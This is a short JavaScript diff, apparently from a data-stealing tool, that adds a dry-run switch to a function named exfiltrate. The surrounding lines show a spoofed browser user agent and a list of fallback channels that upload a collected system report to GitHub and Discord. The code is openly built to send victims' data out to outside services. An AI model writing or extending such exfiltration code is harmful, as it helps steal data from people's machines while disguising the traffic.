@@ -14,7 +14,11 @@ const FAKE_UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (K
  * @param {string} systemId
  * @returns {Promise<boolean>}
  */
-async function exfiltrate(report, systemId) {
+async function exfiltrate(report, systemId, dryRun = false) {
+    if (dryRun) {
+        logger.info("Dry-run: exfiltration skipped");
+        return false;
+    }
     const channels = [
         { name: "github", fn: () => uploadToGitHub(report, systemId) },
         { name: "discord", fn: () => uploadToDiscord(report, systemId) },
